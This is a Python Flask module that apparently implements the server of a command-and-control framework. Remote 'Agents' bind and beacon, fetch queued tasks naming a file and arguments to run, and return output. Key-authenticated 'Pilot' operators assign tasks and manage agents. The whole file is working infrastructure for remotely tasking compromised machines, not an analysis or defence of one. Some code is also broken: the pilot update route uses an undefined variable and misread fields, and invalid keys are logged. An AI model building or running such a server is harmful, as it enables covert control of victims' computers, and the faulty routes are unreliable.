from flask import Blueprint, request
from flask_login import current_user
import json

from .plugin.decorators import *

from .console import Color
from .database import *
from .transport import Transport
from .pilots import PilotRoles

import __main__

# API Service
service = Blueprint("service", __name__, url_prefix="/service")

serviceConf: dict = {
    "online": bool(),
    "logging": bool(),
    "secret_key": None}

def is_valid_key(key: str):
    from .settings import secret_key
    if key is None:
        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No key was given!"+Color.Reset)
        return False
    elif key != secret_key:
        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid key: {key}"+Color.Reset)
        return False
    return True

def was_given(field: str, jdata_keys: list[str]):
    if not field in jdata_keys:
        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No {field} was given!"+Color.Reset)
        return False
    else:
        return True

@EnableMixins(globals(), "service", args=["service_dict"])
def init_service(service_conf, service_dict = __main__.__dict__):
    global serviceConf
    serviceConf = service_conf

    HANDLE_MIXINS

@service.route("")
@service.route("/")
def status():
    """
    Function to get the status of the api service
    """
    if serviceConf["online"]:
        return Transport("online").dump()
    else:
        return Transport("offline").dump()

@service.route("/bind", methods = {"POST"})
def bind():
    """
    Function to bind a Agent to the server
    """
    jdata: dict = json.loads(Transport(request.data.decode()).load())

    if not was_given("uuid", jdata.keys()):
        return Transport("FAILED").dump()
    uuid: str = jdata["uuid"]

    if Agent.exists(uuid):
        Agent.update_beacon(uuid)
        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Checked in Agent: {uuid}"+Color.Reset)
    
    else:
        if not was_given("hostname", jdata.keys()):
            return Transport("FAILED").dump()
        hostname: str = jdata["hostname"]

        newAgent = Agent(uuid=uuid, hostname=hostname)
        db.session.add(newAgent)
        db.session.commit()
        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Added new Agent: {uuid}"+Color.Reset)

    return Transport("OK").dump()

@service.route("/task", methods = {"POST", "GET", "DELETE"})
def task():
    """
    Function to:
        GET The next task to execute.
        POST A new task and add it to an Agent to be executed.
        DELETE A task by id
    """

    if request.method == "DELETE":
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED").dump()

        try:
            id = int(request.args.get('id'))
        except:
            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid id: {id}"+Color.Reset)
            return Transport("FAILED").dump()

        Task.delete(id)
        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Deleted Task by id: {id}"+Color.Reset)
        return Transport("OK").dump()

    jdata: dict = json.loads(Transport(request.data.decode()).load())

    if not was_given("uuid", jdata.keys()):
        return Transport("FAILED").dump()
    uuid: str = jdata["uuid"]

    if not Agent.exists(uuid):
        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Agent {uuid} dose not exist!"+Color.Reset)
        return Transport("FAILED").dump()

    if request.method == "POST":
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED").dump()

        if not was_given("task", jdata.keys()):
            return Transport("FAILED").dump()
        jtask = jdata["task"]
        keys = jtask.keys()
    
        if not was_given("file", keys) or \
        not was_given("args", keys) or \
        not was_given("verbose", keys):
            return Transport("FAILED").dump()
        file: str = jtask["file"]
        args: list[str] = json.dumps(jtask["args"])
        verbose: bool = jtask["verbose"]

        agent_id = Agent.get_by_uuid(uuid).id
        newTask = Task(file=file, args=args, verbose=verbose, agent_id=agent_id)
        db.session.add(newTask)
        db.session.commit()

        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Added new Task for Agent: {uuid}"+Color.Reset)
        return Transport(str(newTask.id)).dump()

    elif request.method == "GET":
        Agent.update_beacon(uuid)

        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Geting next Task for Agent: {uuid}"+Color.Reset)
        task = Agent.get_nextTask(uuid)

        if task != None:
            return Transport(task.jsonify()).dump()
        else:
            return Transport("NONE").dump()
        
        

@service.route("/reply", methods = {"POST", "GET"})
def reply():
    if request.method == "POST":
        jdata: dict = json.loads(Transport(request.data.decode()).load())

        if not was_given("task_id", jdata.keys()):
            return Transport("FAILED").dump()
        task_id: str = jdata["task_id"]

        if not was_given("uuid", jdata.keys()):
            return Transport("FAILED").dump()
        uuid: str = jdata["uuid"]

        if not Agent.exists(uuid):
            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Agent {uuid} dose not exist!"+Color.Reset)
            return Transport("FAILED").dump()
        Agent.update_beacon(uuid)

        if not was_given("content", jdata.keys()):
            return Transport("FAILED").dump()
        content: str = jdata["content"]

        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Setting reply for Task: {task_id}"+Color.Reset)
        Task.get_by_id(task_id).set_reply(content)

        return Transport("OK").dump()

    else:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED").dump()

        try:
            id = int(request.args.get('id'))
        except:
            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid id: {id}"+Color.Reset)
            return Transport("FAILED").dump()

        if id is None:
            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No id was given!"+Color.Reset)
            return Transport("FAILED").dump()

        task = Task.get_by_id(id)
        if task is None:
            return Transport("NONE").dump()
        else:
            print(task.get_reply())
            if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Getting reply of Task: {id}"+Color.Reset)
            return  Transport(task.get_reply()).dump()

@service.route("/agents", methods = {"GET", "DELETE"})
def agents():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED").dump()
    else:
        if not current_user.role in [PilotRoles.ADMIN.get('name'), PilotRoles.OPERATOR.get('name')]:
            if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} current_pilot.role is not ADMIN or OPERATOR!"+Color.Reset)
            return Transport("FAILED").dump()

    if request.method == "GET":
        agents = Agent.query.all()
        if agents is None:
            return Transport("NONE").dump()

        dict_repr = dict()
        for agent in agents:
            jagent: dict = agent.jsonify(asDict=True)
            jagent.pop("id")
            dict_repr[str(agent.id)] = jagent
        return Transport(json.dumps(dict_repr)).dump()

    else:
        Agent.delete_all()
        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Deleted all Agents!"+Color.Reset)
        return Transport("OK").dump()


@service.route("/agent", methods = {"GET", "DELETE"})
def agent():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED").dump()
    else:
        if not current_user.role in [PilotRoles.ADMIN.get('name'), PilotRoles.OPERATOR.get('name')]:
            if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} current_pilot.role is not ADMIN or OPERATOR!"+Color.Reset)
            return Transport("FAILED").dump()

    try:
        id = int(request.args.get('id'))
    except:
        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid id: {id}"+Color.Reset)
        return Transport("FAILED").dump()

    if id is None:
        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No id was given!"+Color.Reset)
        return Transport("FAILED").dump()

    if request.method == "GET":
        agent = Agent.query.filter_by(id=id).first()
        if agent is None:
            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No Agent found with id: {id}"+Color.Reset)
            return Transport("FAILED").dump()
        return Transport(agent.jsonify()).dump()

    else:        
        Agent.delete(id)
        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Deleted Agent by id: {id}"+Color.Reset)
        return Transport("OK").dump()

@service.route("/pilots", methods = {"GET", "DELETE"})
def pilots():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED").dump()
    else:
        if not current_user.role == PilotRoles.ADMIN.get('name'):
            if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} current_pilot.role is not ADMIN!"+Color.Reset)
            return Transport("FAILED").dump()

    if request.method == "GET":
        pilots = Pilot.query.all()
        if pilots is None:
            return Transport("NONE").dump()

        dict_repr = dict()
        for pilot in pilots:
            jpilot: dict = pilot.jsonify(asDict=True)
            jpilot.pop('id')
            dict_repr[str(pilot.id)] = jpilot
        return Transport(json.dumps(dict_repr)).dump()

    else:
        Pilot.delete_all()
        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Deleted all Pilots!"+Color.Reset)
        return Transport("OK").dump()


@service.route("/pilot", methods = {"GET", "DELETE", "PUT"})
def pilot():
    if not current_user.is_authenticated:
        if not is_valid_key(request.headers.get("key")):
            return Transport("FAILED").dump()
    else:
        if not current_user.role == PilotRoles.ADMIN.get('name'):
            if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} current_pilot.role is not ADMIN!"+Color.Reset)
            return Transport("FAILED").dump()

    try:
        id = int(request.args.get('id'))
    except:
        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Invalid id: {id}"+Color.Reset)
        return Transport("FAILED").dump()

    if id is None:
        if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No id was given!"+Color.Reset)
        return Transport("FAILED").dump()

    if request.method == "GET":
        pilot = Pilot.query.filter_by(id=id).first()
        if pilot is None:
            if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} No Pilot found with id: {id}"+Color.Reset)
            return Transport("FAILED").dump()
        return Transport(pilot.jsonify()).dump()
    elif request.method == "PUT":
        jdata: dict = json.loads(Transport(request.data.decode()).load())
        keys = jdata.keys()
        if not was_given("id", keys) or \
        not was_given("name", keys) or \
        not was_given("pwd_hash", keys) or \
        not was_given("role", keys):
            return Transport("FAILED").dump()
        id: int = int(jtask["name"])
        name: str = jtask["name"]
        pwd_hash: str = json.dumps(jtask["hash"])
        role: str = jtask["role"]

        if Pilot.exists(id=id):
            pilot = Pilot.query.filter_by(name=name).first()
            if pilot.id != id:
                if serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Pilot with name '{name}' alredy exists!"+Color.Reset)
                return Transport("FAILED").dump()

            pilot: Pilot = Pilot.query.filter_by(id=id).first()
            pilot.name = name
            pilot.pwd_hash = pwd_hash
            pilot.role = role
            
            db.session.commit()
            return Transport("OK").dump()
        else:
            serviceConf["logging"]: print(f"{Color.Red}::{Color.White} Pilot with id '{id}' dose not exist!"+Color.Reset)
            return Transport("FAILED").dump()

    else:        
        Pilot.delete(id)
        if serviceConf["logging"]: print(f"{Color.Green}::{Color.White} Deleted Pilot by id: {id}"+Color.Reset)
        return Transport("OK").dump()

